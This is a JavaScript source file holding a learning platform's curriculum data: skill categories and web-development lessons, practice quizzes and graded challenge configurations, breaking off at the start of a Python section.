/**
 * Knowledge Base — the curriculum corpus the ProofEngine composes
 * learning paths, lessons, practice and proof challenges from.
 *
 * Content model per topic:
 *   lesson     → EXPLAIN (tldr, sections, example, ask, keyPoints, misconception)
 *   practice   → PRACTICE (checkable questions with hints)
 *   challenge  → PROVE (rubric-backed practical challenge fed to evaluators)
 *
 * Challenge `evaluator.type` maps 1:1 to an evaluator in ./evaluators.js.
 * All scoring is server-side and deterministic.
 */

import { NIMIQ_SKILL, NIMIQ_KB, ENRICH } from './curriculum.js';

export const CATEGORIES = [
  { id: 'coding', label: 'Coding', emoji: '💻' },
  { id: 'design', label: 'Design', emoji: '🎨' },
  { id: 'marketing', label: 'Marketing', emoji: '📈' },
  { id: 'ai', label: 'AI', emoji: '🤖' },
  { id: 'music', label: 'Music', emoji: '🎵' },
  { id: 'languages', label: 'Languages', emoji: '🗣️' },
  { id: 'business', label: 'Business', emoji: '💼' },
  { id: 'social', label: 'Social Media', emoji: '📱' },
  { id: 'writing', label: 'Writing', emoji: '✍️' },
  { id: 'data', label: 'Data', emoji: '📊' },
  { id: 'practical', label: 'Practical Skills', emoji: '🔧' },
  { id: 'blockchain', label: 'Blockchain', emoji: '⛓️' },
  { id: 'security', label: 'Security', emoji: '🔐' },
  { id: 'games', label: 'Games & Strategy', emoji: '♟️' },
];

export const SKILLS = [
  { slug: 'web-development', name: 'Web Development', category: 'coding', emoji: '💻', blurb: 'Build real websites and web apps — HTML, CSS, JavaScript, APIs.' },
  { slug: 'python', name: 'Python', category: 'coding', emoji: '🐍', blurb: 'Automate, analyze, and build with the world’s most beginner-friendly language.' },
  { slug: 'ui-design', name: 'UI Design', category: 'design', emoji: '🎨', blurb: 'Design interfaces people understand instantly.' },
  { slug: 'marketing', name: 'Marketing', category: 'marketing', emoji: '📈', blurb: 'Position, message, and sell — with campaigns that actually run.' },
  { slug: 'ai', name: 'AI', category: 'ai', emoji: '🤖', blurb: 'Use AI tools and workflows to do real work faster.' },
  { slug: 'music-production', name: 'Music Production', category: 'music', emoji: '🎵', blurb: 'Chords, arrangement, and finishing tracks.' },
  { slug: 'languages', name: 'Languages', category: 'languages', emoji: '🗣️', blurb: 'Hold real conversations — German, French, Spanish, Mandarin & more.' },
  { slug: 'business', name: 'Business', category: 'business', emoji: '💼', blurb: 'Models, pricing, and plans that survive contact with customers.' },
  { slug: 'social-media', name: 'Social Media', category: 'social', emoji: '📱', blurb: 'Grow an audience with content systems, not luck.' },
  { slug: 'writing', name: 'Writing', category: 'writing', emoji: '✍️', blurb: 'Clear, persuasive writing for the web.' },
  { slug: 'data-analysis', name: 'Data Analysis', category: 'data', emoji: '📊', blurb: 'Find the story in numbers and defend it.' },
  { slug: 'practical-skills', name: 'Practical Skills', category: 'practical', emoji: '🔧', blurb: 'Everyday competence: budgeting, repair, planning.' },
  { slug: 'cybersecurity', name: 'Cybersecurity', category: 'security', emoji: '🔐', blurb: 'Learn offensive and defensive security — from Linux to exploitation.' },
  { slug: 'chess', name: 'Chess', category: 'games', emoji: '♟️', blurb: 'Master strategy and tactics from beginner to advanced with interactive puzzles and AI coaching.' },
  NIMIQ_SKILL,
];

const T = (o) => o; // readability helper

export const KB = {
  /* ══════════════════════════ WEB DEVELOPMENT ══════════════════════ */
  'web-development': T({
    goalKeywords: ['web', 'website', 'websites', 'webpage', 'html', 'css', 'javascript', 'js', 'frontend', 'front-end', 'landing page', 'web development', 'web dev', 'web app', 'build websites', 'portfolio'],
    topics: [
      {
        slug: 'html-fundamentals', title: 'HTML Fundamentals', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'HTML is the skeleton of every webpage. You describe meaning (a heading, a link, an image), and the browser renders it.',
          sections: [
            { h: 'Elements & tags', body: 'An element usually has an opening tag, content, and a closing tag: <p>Hello</p>. Tags nest — a list contains list items; a page contains sections. Indentation keeps nesting readable.' },
            { h: 'A minimal page', body: 'Every page needs a doctype, an html element with a lang attribute, a head (title, meta) and a body (what people see).' },
            { h: 'Semantic structure', body: 'Use tags for their meaning: <header>, <nav>, <main>, <article>, <footer>. Screen readers and search engines read meaning, not pixels. A <div> soup says nothing; semantics say everything.' },
          ],
          example: { lang: 'html', code: [
            '<!DOCTYPE html>',
            '<html lang="en">',
            '  <head>',
            '    <meta charset="utf-8">',
            '    <meta name="viewport" content="width=device-width, initial-scale=1">',
            '    <title>Ada’s Coffee</title>',
            '  </head>',
            '  <body>',
            '    <header>',
            '      <h1>Ada’s Coffee</h1>',
            '      <nav><a href="#menu">Menu</a> <a href="#visit">Visit</a></nav>',
            '    </header>',
            '    <main>',
            '      <article><h2>Slow-roasted, small batch</h2><p>We roast weekly.</p></article>',
            '    </main>',
            '    <footer><p>© Ada’s Coffee</p></footer>',
            '  </body>',
            '</html>',
          ].join('\n') },
          ask: 'Which element would you use for the main navigation links: <div>, <nav>, or <footer>?',
          keyPoints: [
            'HTML describes meaning, not appearance',
            'Semantic elements: header, nav, main, article, footer',
            'Every page: doctype, html[lang], head with title + viewport meta, body',
            'Alt text on images describes them for people who cannot see them',
          ],
          misconception: '“HTML is programming.” It is markup — you annotate content; there is no logic or looping.',
        },
        practice: [
          { q: 'Which tag pair marks the most important heading on the page?', choices: ['<h6></h6>', '<heading></heading>', '<h1></h1>', '<title></title>'], answerIdx: 2, hint: 'Headings run from most to least important.', why: '<h1> is the top-level heading; <title> lives in <head> and shows in the browser tab.' },
          { q: 'What does the viewport meta tag do?', choices: ['Adds a view counter', 'Makes the page width follow the device screen', 'Loads fonts faster', 'Nothing on modern sites'], answerIdx: 1, hint: 'Think mobile.', why: 'Without it, mobile browsers render a zoomed-out desktop layout — the #1 responsive bug.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Build a semantic mini-page', timeMin: 25,
          brief: 'Write a complete, semantic HTML page for a small business of your choice (café, studio, barber…). Everything in one HTML file; inline <style> allowed for light styling.',
          requirements: ['Doctype + html[lang] + title', 'header with h1 and nav (3 links)', 'main with an article', 'an image with meaningful alt text', 'footer with contact line'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'html', config: { required: ['nav', 'article', 'footer', 'h1', 'img'], needViewport: true, needLang: true, needAlt: true, minNavLinks: 3 } },
        },
      },
      {
        slug: 'css-fundamentals', title: 'CSS Fundamentals', estMin: 30, difficulty: 1,
        lesson: {
          tldr: 'CSS controls how HTML looks: color, spacing, type, layout. You select elements, then declare properties.',
          sections: [
            { h: 'Selectors & the cascade', body: 'A rule = selector + declarations. Later rules and more specific selectors win. Classes (.card) are your everyday selector; IDs are rarely worth it.' },
            { h: 'The box model', body: 'Every element is a box: content, padding, border, margin. Spacing bugs are almost always box-model misunderstandings.' },
            { h: 'Layout: flex & grid', body: 'Flexbox lays out children in a row or column (navbars, button rows). Grid places things in rows AND columns (page layouts). Modern layouts rarely need floats.' },
          ],
          example: { lang: 'css', code: [
            ':root { --brand: #5b57d9; --space: 16px; }',
            '.card {',
            '  background: #fff;',
            '  padding: var(--space);',
            '  border-radius: 12px;',
            '  box-shadow: 0 2px 10px rgba(20,20,60,.08);',
            '}',
            '.row { display: flex; gap: var(--space); align-items: center; }',
            'h1 { color: var(--brand); line-height: 1.2; }',
          ].join('\n') },
          ask: 'You want equal gaps between three cards in a row. Which is cleaner: margins on each card, or flex gap?',
          keyPoints: [
            'Selector → declarations; specificity + source order decide conflicts',
            'Box model: content, padding, border, margin',
            'Flexbox for one axis, Grid for two axes',
            'Custom properties (--var) keep design consistent',
          ],
          misconception: '“Centering is hard.” With flex it is two lines: display:flex; justify-content/align-items.',
        },
        practice: [
          { q: 'Which property adds space INSIDE an element’s border?', choices: ['margin', 'padding', 'gap', 'outline'], answerIdx: 1, hint: 'Padding pads the inside; margin pushes neighbours away.', why: 'padding is internal spacing; margin is external.' },
          { q: 'Best tool for a page with a sidebar and a content area?', choices: ['float', 'grid', 'absolute positioning', 'tables'], answerIdx: 1, hint: 'Two axes → one word.', why: 'Grid handles rows + columns directly.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Style a product card set', timeMin: 30,
          brief: 'Extend your mini-page: build a section with three product/pricing cards styled with CSS. Show real use of flexbox or grid, custom properties, and a consistent spacing scale.',
          requirements: ['3 cards in a responsive row (flex or grid)', 'custom properties for color/spacing', 'consistent padding & radius', 'hover/focus state on buttons or links'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'html', config: { required: ['nav', 'footer', 'h1'], needViewport: true, needLang: true, minCards: 3, wantFlexOrGrid: true, wantCustomProps: true, minCssProps: 10 } },
        },
      },
      {
        slug: 'responsive-layout', title: 'Responsive Layout', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'One page, every screen. Design mobile-first with fluid layout, then add media queries where the layout genuinely needs to change.',
          sections: [
            { h: 'Mobile-first', body: 'Write styles for small screens first, then enhance with min-width media queries. It is easier to add complexity than to remove it.' },
            { h: 'Fluid units', body: 'Prefer relative units: %, rem, clamp(). Fixed pixel widths are what break phones.' },
            { h: 'The viewport meta', body: '<meta name="viewport" content="width=device-width, initial-scale=1"> — without it phones fake a 980px desktop and zoom out.' },
          ],
          example: { lang: 'css', code: [
            '/* mobile first */',
            '.grid { display: grid; gap: 1rem; grid-template-columns: 1fr; }',
            '@media (min-width: 640px) {',
            '  .grid { grid-template-columns: repeat(2, 1fr); }',
            '}',
            '@media (min-width: 960px) {',
            '  .grid { grid-template-columns: repeat(3, 1fr); }',
            '}',
          ].join('\n') },
          ask: 'At what screen width should you add your first media query — and how do you decide?',
          keyPoints: [
            'Start small, enhance upward (min-width queries)',
            'Fluid units: %, rem, clamp()',
            'Viewport meta is mandatory',
            'Test at 320px — the smallest common phone width',
          ],
          misconception: '“Responsive = media queries.” Fluid layout does most of the work; queries only rebalance.',
        },
        practice: [
          { q: 'Which media query approach fits mobile-first?', choices: ['max-width: 960px', 'min-width: 640px', 'width: 100%', 'orientation: desktop'], answerIdx: 1, hint: 'You enhance as screens grow.', why: 'min-width queries add styles as space becomes available.' },
          { q: 'A font size that scales smoothly between 16px and 22px:', choices: ['font-size: 22px', 'font-size: 2vw', 'font-size: clamp(1rem, 1.5rem + 1vw, 1.375rem)', 'font-size: auto'], answerIdx: 2, hint: 'clamp(min, preferred, max).', why: 'clamp() bounds fluid scaling — vw alone can shrink text unreadably small.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Make it truly responsive', timeMin: 30,
          brief: 'Take any page structure and make it work from 320px to desktop: mobile-first CSS, at least two media queries, fluid type/spacing, and a navigation that adapts on small screens.',
          requirements: ['viewport meta', 'min-width media queries (≥2)', 'fluid units (clamp/rem/%)', 'nav adapts on mobile', 'nothing overflows at 320px'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'html', config: { required: ['nav', 'footer', 'h1'], needViewport: true, needLang: true, minMediaQueries: 2, wantFluidUnits: true, minNavLinks: 2 } },
        },
      },
      {
        slug: 'javascript-basics', title: 'JavaScript Basics', estMin: 35, difficulty: 2,
        lesson: {
          tldr: 'JavaScript makes pages behave: it stores values, makes decisions, repeats work, and reacts to events.',
          sections: [
            { h: 'Variables & types', body: 'let and const name values. Numbers, strings, booleans, arrays, objects cover 95% of day-to-day code. Prefer const; switch to let only when reassigning.' },
            { h: 'Functions — reusable machines', body: 'A function takes inputs, does work, and returns an output. Define once, call anywhere. If you copy-paste code twice, make a function.' },
            { h: 'Decisions & loops', body: 'if/else picks a path; for/of repeats over lists. Arrays ship with helpers — map, filter, find — that replace most manual loops.' },
          ],
          example: { lang: 'js', code: [
            'const prices = [4, 8, 15];',
            '',
            'function totalWithTip(amounts, tipRate) {',
            '  const sum = amounts.reduce((a, b) => a + b, 0);',
            '  return Math.round(sum * (1 + tipRate));',
            '}',
            '',
            'console.log(totalWithTip(prices, 0.1)); // 30',
          ].join('\n') },
          ask: 'If a function returns nothing, what does calling it evaluate to?',
          keyPoints: [
            'const by default, let when reassigning',
            'Functions: inputs → work → return',
            'if/else branches; for/of and array helpers iterate',
            'Events connect user actions to code',
          ],
          misconception: '“Functions must return something.” A function without return gives undefined — useful for side effects like updating the page.',
        },
        practice: [
          { q: 'What does this log: const x = [1,2,3]; console.log(x.map(n => n * 2));', choices: ['[1,2,3]', '[2,4,6]', '6', 'undefined'], answerIdx: 1, hint: 'map transforms each item.', why: 'map returns a NEW array of transformed values.' },
          { q: 'Which keyword creates a binding you will NOT reassign?', choices: ['var', 'let', 'const', 'static'], answerIdx: 2, hint: 'Constant.', why: 'const bindings cannot be reassigned.' },
        ],
        challenge: {
          type: 'js-static', kind: 'checkpoint', title: 'Write two pure functions', timeMin: 30,
          brief: 'Write JavaScript (in one code block) that defines: 1) isPalindrome(text) → true if the text reads the same ignoring case and spaces; 2) topLongest(words, n) → the n longest words, longest first. Then explain in 2-3 sentences how you handled edge cases.',
          requirements: ['isPalindrome defined, handles case & spaces, returns boolean', 'topLongest defined, sorts by length, slices to n', 'no syntax errors (statically checked)', 'short edge-case explanation'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'js-static', config: { checks: [
            { id: 'palindrome', label: 'isPalindrome defined', pattern: 'function\\s+isPalindrome|isPalindrome\\s*=\\s*\\(' , weight: 15 },
            { id: 'normalize', label: 'normalizes case (toLowerCase)', pattern: 'toLowerCase', weight: 15 },
            { id: 'reverse', label: 'reverses text (split/reverse/join or loop)', pattern: 'reverse|for\\s*\\(|while\\s*\\(', weight: 20 },
            { id: 'topLongest', label: 'topLongest defined', pattern: 'function\\s+topLongest|topLongest\\s*=\\s*\\(', weight: 15 },
            { id: 'sort', label: 'sorts by length', pattern: 'sort', weight: 15 },
            { id: 'slice', label: 'limits to n (slice)', pattern: 'slice|splice|for[\\s\\S]{0,200}break', weight: 10 },
          ], explainMinWords: 25 } },
        },
      },
      {
        slug: 'dom-events', title: 'The DOM & Events', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'The DOM is the page as a live object tree. JavaScript reads and changes it; events tell your code when the user acts.',
          sections: [
            { h: 'Selecting & updating', body: 'document.querySelector(".menu") finds one element; textContent, classList and setAttribute change it. Change the DOM; never rewrite innerHTML with user data (that is the XSS hole).' },
            { h: 'Listening', body: 'element.addEventListener("click", handler) runs your function when the user clicks. Common events: click, input, submit, keydown.' },
            { h: 'Forms & state', body: 'Read values with .value, prevent default submission with event.preventDefault(), then update the page from your own state.' },
          ],
          example: { lang: 'js', code: [
            'const form = document.querySelector("#signup");',
            'const list = document.querySelector("#people");',
            'form.addEventListener("submit", (event) => {',
            '  event.preventDefault();',
            '  const name = form.querySelector("input").value.trim();',
            '  if (!name) return;',
            '  const li = document.createElement("li");',
            '  li.textContent = name;',
            '  list.append(li);',
            '  form.reset();',
            '});',
          ].join('\n') },
          ask: 'Why is textContent safer than innerHTML when inserting user-typed text?',
          keyPoints: [
            'querySelector selects; textContent/classList update',
            'addEventListener reacts to user actions',
            'preventDefault stops unwanted form submits',
            'Never inject raw user input as HTML (XSS)',
          ],
          misconception: '“The page and the script are separate things.” The script holds a live reference to the page — change the object and the screen updates.',
        },
        practice: [
          { q: 'Which method attaches a click handler?', choices: ['element.onClick =', 'element.addEventListener("click", fn)', 'element.click(fn)', 'listen(element, "click")'], answerIdx: 1, hint: 'The standard DOM API.', why: 'addEventListener supports multiple handlers and options.' },
          { q: 'Safest way to show a user-typed name in a <li>?', choices: ['li.innerHTML = name', 'li.textContent = name', 'document.write(name)', 'li.append(name)'], answerIdx: 1, hint: 'Which one treats it as plain text?', why: 'textContent inserts text, never parses HTML — no XSS.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Interactive page with JavaScript', timeMin: 35,
          brief: 'Build a single-file page with a small interactive feature: a form or buttons that change the page (e.g. a to-do list, a color theme switcher, a live character counter). Use addEventListener and update the DOM in response.',
          requirements: ['a form or button control', 'addEventListener used', 'DOM updates in response to input', 'semantic structure + viewport meta', 'no inline onclick attributes'],
          passScore: 70, rewardNim: 3, xp: 120,
          evaluator: { type: 'html', config: { required: ['nav', 'h1', 'script'], needViewport: true, needLang: true, needEventListener: true, minNavLinks: 2 } },
        },
      },
      {
        slug: 'apis-fetch', title: 'Working with APIs', estMin: 30, difficulty: 3,
        lesson: {
          tldr: 'APIs let your page talk to servers. fetch() asks a URL for JSON; you handle the promise, then render.',
          sections: [
            { h: 'Requests & JSON', body: 'fetch(url) returns a promise of a Response. Call response.json() to parse. GET reads; POST sends (with headers + body).' },
            { h: 'Async/await', body: 'await pauses inside an async function until the promise settles — asynchronous code that reads top-to-bottom.' },
            { h: 'Failure is normal', body: 'Networks fail. Wrap fetch in try/catch, check response.ok, and always render a fallback state. A silent broken page is a bug.' },
          ],
          example: { lang: 'js', code: [
            'async function loadUsers() {',
            '  try {',
            '    const res = await fetch("https://api.example.dev/users");',
            '    if (!res.ok) throw new Error("HTTP " + res.status);',
            '    const users = await res.json();',
            '    render(users);',
            '  } catch (err) {',
            '    showError("Could not load users.");',
            '  }',
            '}',
          ].join('\n') },
          ask: 'fetch() resolved but res.ok is false. What happened, and what do you show the user?',
          keyPoints: [
            'fetch → Response → response.json()',
            'async/await makes async code readable',
            'Check res.ok and catch network errors',
            'Never trust API data — validate before rendering',
          ],
          misconception: '“fetch failing throws immediately.” Only network failure rejects; HTTP 404/500 still resolves — you must check res.ok.',
        },
        practice: [
          { q: 'What does response.json() return?', choices: ['a string of JSON', 'a promise resolving to parsed data', 'an XML document', 'a DOM node'], answerIdx: 1, hint: 'It needs an await.', why: 'It is asynchronous — await it to get the parsed object.' },
          { q: 'Which status means “created successfully” after a POST?', choices: ['200', '301', '201', '404'], answerIdx: 2, hint: '2xx = success family.', why: '201 Created is the standard POST success.' },
        ],
        challenge: {
          type: 'text', kind: 'checkpoint', title: 'Design an API integration', timeMin: 25,
          brief: 'Describe (250+ words) how you would add a “live weather” section to a webpage: which endpoint you call, how you fetch with async/await, what you render, and exactly what happens when the API is down. Include a short code sketch for the fetch call with error handling.',
          requirements: ['endpoint + data shape described', 'async/await fetch with res.ok check', 'try/catch + user-facing fallback', 'rendering plan', '250+ words'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 200, targetWords: 280, keyConcepts: ['fetch', 'await', 'catch', 'ok', 'render', 'error', 'json'], headings: 0, keyConceptRatio: 0.5 } },
        },
      },
      {
        slug: 'web-project', title: 'Build a Real Page', estMin: 45, difficulty: 3,
        lesson: {
          tldr: 'Time to combine everything: semantic HTML, responsive CSS, and a sprinkle of JavaScript in one shippable page.',
          sections: [
            { h: 'Ship small', body: 'A finished small page beats an unfinished big one. Pick a real subject — your portfolio, a local shop, a product you love.' },
            { h: 'Checklist thinking', body: 'Pros verify: viewport meta? alt text? contrast? keyboard focus? Test at 320px before you celebrate.' },
            { h: 'Read your own code', body: 'Consistent naming (classes like card, hero, btn), one <style> block organized by section, comments only where needed.' },
          ],
          example: { lang: 'text', code: 'Plan: 1) hero with h1 + cta  2) features grid (3 cards)  3) contact form with JS validation  4) footer. Mobile-first: single column → 2 cols ≥640px → 3 cols ≥960px.' },
          ask: 'What is the first thing you test after the page “looks done”?',
          keyPoints: ['Finish small, finish fully', 'Verify accessibility + 320px', 'Consistent naming and structure', 'Ship, then iterate'],
          misconception: '“It looks good on my laptop.” Your users are on phones — test where they are.',
        },
        practice: [
          { q: 'Which is a better class name for a repeated card component?', choices: ['.blue-box-2', '.card', '.div1', '.x'], answerIdx: 1, hint: 'Name what it IS, not what it looks like.', why: 'Semantic names survive redesigns.' },
          { q: 'Best first test after building a page?', choices: ['Check at 320px width', 'Add more animations', 'Post it online', 'Minify CSS'], answerIdx: 0, hint: 'Where do most users live?', why: 'Phones are the majority — catch breakage at the smallest width first.' },
        ],
        challenge: {
          type: 'html', kind: 'project', title: 'Build a responsive product landing page', timeMin: 40,
          brief: 'Build a complete one-file landing page for a product or service of your choice: header with nav, hero with clear headline and call-to-action, three feature/content cards, an image with alt text, and a footer. Fully responsive (320px → desktop) and accessible.',
          requirements: ['✓ responsive (viewport + media queries + fluid units)', '✓ accessible (alt text, lang, heading order, focus styles)', '✓ semantic HTML (header/nav/main/footer)', '✓ mobile navigation that adapts', '✓ hero + 3 cards + footer with contact'],
          passScore: 70, rewardNim: 3, xp: 150,
          evaluator: { type: 'html', config: { required: ['nav', 'article', 'footer', 'h1', 'img'], needViewport: true, needLang: true, needAlt: true, minNavLinks: 3, minMediaQueries: 1, wantFluidUnits: true, minCards: 3, minCssProps: 12 } },
        },
      },
      {
        slug: 'forms-and-validation', title: 'Forms & Validation', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Forms are how users send information. Clear labels, sensible validation, and helpful error states make them usable instead of frustrating.',
          sections: [
            { h: 'Inputs & labels', body: 'Every field should have a label and a clear name. input types (text, email, password, number) tell the browser the right keyboard and validation rules.' },
            { h: 'Validation', body: 'Use required, pattern, minLength, and input types to catch common errors before submission. Good validation is early and specific.' },
            { h: 'Error states', body: 'A user should know what went wrong and how to fix it. Error copy should say what is missing rather than only saying “invalid.”' },
          ],
          example: { lang: 'html', code: '<form novalidate>\n  <label for="email">Email</label>\n  <input id="email" type="email" required>\n  <button type="submit">Join</button>\n</form>' },
          ask: 'What is the difference between a placeholder and a label in a form?',
          keyPoints: ['Labels are for accessibility and clarity', 'Validation should be proactive and specific', 'Good forms reduce friction instead of adding surprise', 'Error copy should guide the fix'],
          misconception: '“If the input works, the form is done.” Real forms fail gracefully when data is missing or misformatted.',
        },
        practice: [
          { q: 'What does the email input type do automatically?', choices: ['Only changes color', 'Shows a numeric keypad', 'Provides email validation and keyboard hints', 'Disables submission forever'], answerIdx: 2, hint: 'Browser-level rules.', why: 'type="email" encourages valid input and helps browsers validate it.' },
          { q: 'A label should be…', choices: ['hidden with CSS', 'visible and associated with the field', 'a placeholder only', 'omitted for accessibility'], answerIdx: 1, hint: 'Think usability.', why: 'Visible labels are essential for accessibility and clarity.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Build a validated contact form', timeMin: 30,
          brief: 'Create a simple contact form with name, email, and message fields. Add clear labels, required validation, and one helpful error or empty-state message. Keep the layout clean and mobile-friendly.',
          requirements: ['label for every field', 'required validation', 'email field with proper type', 'clear error/empty-state copy', 'mobile layout'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'html', config: { required: ['label', 'input', 'button', 'form'], needLang: true, needViewport: true, minInputs: 3, minNavLinks: 1 } },
        },
      },
      {
        slug: 'css-grid-layout', title: 'CSS Grid Layout', estMin: 35, difficulty: 2,
        lesson: {
          tldr: 'CSS Grid is the modern tool for two-dimensional layouts: rows and columns, predictable spacing, and flexible content areas.',
          sections: [
            { h: 'Grid basics', body: 'display: grid creates a 2D layout. grid-template-columns and grid-template-rows decide the structure; gap controls spacing between cells.' },
            { h: 'Placement', body: 'Items can span multiple columns or rows with grid-column and grid-row, which makes header, sidebar, and content layouts easy to reason about.' },
            { h: 'Responsive by design', body: 'Grid works beautifully with media queries: one column on mobile, multiple on larger screens, while the content order stays logical.' },
          ],
          example: { lang: 'css', code: '.layout {\n  display: grid;\n  grid-template-columns: 1fr;\n  gap: 1rem;\n}\n\n@media (min-width: 700px) {\n  .layout {\n    grid-template-columns: 240px 1fr;\n  }\n}' },
          ask: 'When do you choose Grid instead of Flexbox?',
          keyPoints: ['Grid handles 2D layout', 'Flexbox is best for one axis', 'Responsive layouts become easier to reason about', 'Spacing and alignment are predictable'],
          misconception: '“Grid replaces Flexbox.” They solve different problems: Grid for layouts, Flexbox for spacing and alignment inside a region.',
        },
        practice: [
          { q: 'What type of layout is Grid best at?', choices: ['One-dimensional lists only', 'Two-dimensional page structure', 'Text color only', 'Form field layout only'], answerIdx: 1, hint: 'Rows + columns.', why: 'Grid handles both axes at once.' },
          { q: 'Which property defines columns?', choices: ['justify-content', 'grid-template-columns', 'padding', 'margin'], answerIdx: 1, hint: 'Think structure.', why: 'grid-template-columns controls the number and size of columns.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Make a responsive grid landing page', timeMin: 35,
          brief: 'Design a small landing page using CSS Grid for the main page structure and card layout. It should collapse to one column on mobile and expand to a richer multi-column layout on larger screens.',
          requirements: ['grid-based main layout', 'at least 3 cards or content blocks', 'mobile-first responsive behavior', 'clear spacing and alignment'],
          passScore: 70, rewardNim: 2, xp: 120,
          evaluator: { type: 'html', config: { required: ['grid', 'card', 'header', 'main'], needViewport: true, wantFlexOrGrid: true, minCards: 3 } },
        },
      },
      {
        slug: 'accessibility-essentials', title: 'Accessibility Essentials', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Accessible design is not a bonus layer — it is part of good product quality. Clear structure, contrast, and keyboard support help everyone.',
          sections: [
            { h: 'Semantics', body: 'Use semantic HTML like header, main, nav, button, and label. Screen readers rely on those meanings much more than on visual style.' },
            { h: 'Focus & keyboard', body: 'Every interactive element should be usable without a mouse. Focus rings and logical tab order are part of accessibility, not decoration.' },
            { h: 'Contrast & language', body: 'Readable contrast and clear language matter. Use color thoughtfully, provide alt text, and write instructions unambiguously.' },
          ],
          example: { lang: 'html', code: '<button aria-label="Close dialog">✕</button>\n<nav aria-label="Main navigation">...</nav>' },
          ask: 'Why is a button element better than a div with a click handler?',
          keyPoints: ['Semantic HTML improves screen reader support', 'Keyboard access is essential', 'Good contrast and labels are part of quality', 'Accessible design is easier for everyone'],
          misconception: '“Accessibility is for edge cases.” It matters on the everyday path, not only for special situations.',
        },
        practice: [
          { q: 'Why is alt text important?', choices: ['It is only for SEO', 'It helps screen-reader users understand images', 'It makes all images larger', 'It is optional'], answerIdx: 1, hint: 'Think access.', why: 'Alt text conveys the meaning of informative images to non-visual users.' },
          { q: 'A focus ring is…', choices: ['purely decorative', 'a keyboard navigation aid', 'not relevant to web design', 'a color-only cue'], answerIdx: 1, hint: 'Keyboard users need it.', why: 'Visible focus helps keyboard users know where they are.' },
        ],
        challenge: {
          type: 'html', kind: 'checkpoint', title: 'Audit an accessible page', timeMin: 30,
          brief: 'Review a small page and explain how it could be improved for accessibility. Identify at least 3 issues and propose concrete fixes using semantic HTML, focus styling, and better labels or contrast. ',
          requirements: ['at least 3 accessibility issues', 'concrete fixes', 'mentions keyboard access or labels', 'clear rationale'],
          passScore: 70, rewardNim: 2, xp: 120,
          evaluator: { type: 'text', config: { minWords: 120, keyConcepts: ['alt', 'label', 'focus', 'contrast', 'keyboard', 'semantic', 'screen reader'], keyConceptRatio: 0.5 } },
        },
      },
      {
        slug: 'debugging-devtools', title: 'Debugging with DevTools', estMin: 35, difficulty: 3,
        lesson: {
          tldr: 'Browsers expose the debugging toolkit you need: the Elements panel, console, and network tab. Learn to read them and most bugs become obvious.',
          sections: [
            { h: 'Console & errors', body: 'The console shows runtime errors, warnings, and values. reading the stack trace usually points to the exact statement that failed.' },
            { h: 'Elements & computed styles', body: 'Inspect HTML and CSS live. A wrong margin, missing class, or collapsed layout often shows up instantly in the Elements panel.' },
            { h: 'Network & performance', body: 'Check if API requests fail, slow down, or return unexpected data. The network tab is where broken frontends often reveal their truth.' },
          ],
          example: { lang: 'text', code: 'Open DevTools → Console: look for TypeError or Uncaught ReferenceError. Then inspect the element and see if the class or CSS selector actually exists.' },
          ask: 'When a button does nothing, what is the first debugging tool you open?',
          keyPoints: ['Read the console before guessing', 'Inspect the DOM and styles live', 'Use the network tab for broken requests', 'A small reproducible bug is easier to fix'],
          misconception: '“It must be the browser.” More often it is a selector mismatch, a missing class, or a failed fetch.',
        },
        practice: [
          { q: 'Which panel usually reveals a failed API request?', choices: ['Memory', 'Network', 'Application', 'Search'], answerIdx: 1, hint: 'Requests and responses.', why: 'The Network tab shows what was requested and what came back.' },
          { q: 'If a script throws a TypeError, where do you look first?', choices: ['Console', 'Theme editor', 'CSS reset', 'Server logs only'], answerIdx: 0, hint: 'Errors appear there.', why: 'The Console usually contains the exact message and stack trace.' },
        ],
        challenge: {
          type: 'text', kind: 'checkpoint', title: 'Diagnose a broken web page', timeMin: 35,
          brief: 'Describe a realistic debugging workflow for a page that loads but has a button that does nothing. State what you would check in the console, Elements panel, and Network tab, and how you would verify the fix.',
          requirements: ['console check named', 'elements/style check named', 'network request check named', 'verification steps included'],
          passScore: 70, rewardNim: 3, xp: 140,
          evaluator: { type: 'text', config: { minWords: 120, keyConcepts: ['console', 'element', 'network', 'error', 'selector', 'request', 'debug'], keyConceptRatio: 0.5 } },
        },
      },
    ],
    finalAssessment: {
      type: 'html', kind: 'final', title: 'Final Skill Assessment: Full Landing Experience', timeMin: 45,
      brief: 'Prove your full web development ability: a polished, responsive, accessible one-file site with navigation, hero, cards, an interactive element (form validation or toggle), and clean, organized code.',
      requirements: ['all prior requirements', 'interactive JavaScript feature with addEventListener', 'form labels / aria where relevant', 'organized CSS with custom properties'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'html', config: { required: ['nav', 'article', 'footer', 'h1', 'script'], needViewport: true, needLang: true, needAlt: true, needEventListener: true, minNavLinks: 3, minMediaQueries: 1, wantFluidUnits: true, minCards: 2, minCssProps: 14 } },
    },
  }),

  /* ══════════════════════════════ PYTHON ═══════════════════════════ */
  python: T({
    goalKeywords: ['python', 'automation', 'script', 'pandas', 'backend', 'django', 'flask', 'automate'],
    topics: [
      {
        slug: 'python-syntax', title: 'Python Syntax & Variables', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Python trades punctuation for readability: indentation defines blocks, names point to values.',
          sections: [
            { h: 'Variables & types', body: 'No type declarations: name = "Ada" makes a string, pi = 3.14 a float, ready = True a bool. f-strings format: f"Hi {name}".' },
            { h: 'Indentation is structure', body: 'Blocks are defined by consistent 4-space indentation — the colon opens a block: if ready: print("go").' },
